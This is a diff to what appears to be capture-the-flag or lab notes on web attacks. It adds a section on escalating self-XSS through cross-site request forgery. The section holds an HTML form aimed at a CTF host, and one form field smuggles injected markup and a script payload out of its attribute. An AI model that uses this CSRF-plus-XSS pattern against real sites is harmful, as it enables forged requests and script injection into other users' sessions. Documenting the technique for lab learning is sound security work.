@@ -71,3 +71,16 @@ Delete CSRF on the request
 </body>
 </html>
 ```
+
+# Escalating Self-XSS with Cross-Site Request Forgery (CSRF)
+
+```html
+<html>
+  <body>
+    <form action="https://uazfyzwu.eu1.ctfio.com/post/" method="POST">
+      <input type="hidden" name="name" value="0000000"><U>test123<script>alert()</script>
+      <input type="submit" value="Submit">
+    </form>
+  </body>
+</html>
+```
